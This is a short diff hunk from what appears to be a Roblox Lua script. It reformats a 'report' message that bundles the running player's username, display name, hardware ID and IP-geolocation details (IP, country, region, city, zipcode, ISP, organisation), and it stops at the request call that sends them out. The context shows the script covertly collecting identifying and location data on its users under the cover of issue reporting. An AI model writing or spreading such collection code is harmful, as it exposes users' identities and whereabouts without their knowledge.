@@ -50,7 +50,7 @@ local FI = {
 }
 local dataMessage = string.format("```diff\n- Username: %s \n- Display Name: "..game.Players.LocalPlayer.DisplayName.."\n- Using: "..webhookcheck.."\n- HWID: "..HWIDCHECK.."\n- IP: %s\n- Country: %s\n- Country Code: %s\n- Region: %s\n- Region Name: %s\n- City: %s\n- Zipcode: %s\n- ISP: %s\n- Org: %s```", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
 local MessageData = {
-    ["content"] = ""..game.Players.LocalPlayer.DisplayName.." Reported: "..dataMessage.."\nREPORT: ".._G.ReportingIssue..""
+    ["content"] = ""..game.Players.LocalPlayer.DisplayName.." Reported: "..dataMessage.."\nREPORT:```diff\n- ".._G.ReportingIssue.."```"
 }
  
 req(
